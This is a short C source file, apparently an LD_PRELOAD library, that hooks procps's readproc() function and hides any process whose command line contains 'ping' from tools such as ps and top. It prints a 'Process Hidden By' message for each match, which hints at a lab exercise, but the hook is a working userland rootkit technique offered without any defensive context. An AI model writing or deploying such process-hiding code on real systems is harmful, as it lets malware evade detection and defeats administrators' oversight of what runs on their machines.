#define _GNU_SOURCE
#include <dlfcn.h>
#include <string.h>
#include <stdio.h>
#include <proc/readproc.h>
int hide_proc (char *cmdline) {
	if (strstr(cmdline, "ping")) {
		printf("Process Hidden By F08921A01: %s\n", cmdline);
		return 1;
	}
	return 0;
}

proc_t* readproc (PROCTAB *PT, proc_t *return_buf) {
	typeof(readproc) *old_readproc = dlsym(RTLD_NEXT, "readproc");
	proc_t* ret_value = old_readproc(PT, return_buf);
	while (ret_value && ret_value->cmdline && hide_proc(ret_value->cmdline[0])) {
		ret_value = old_readproc(PT, return_buf);
	}
	return ret_value;
}
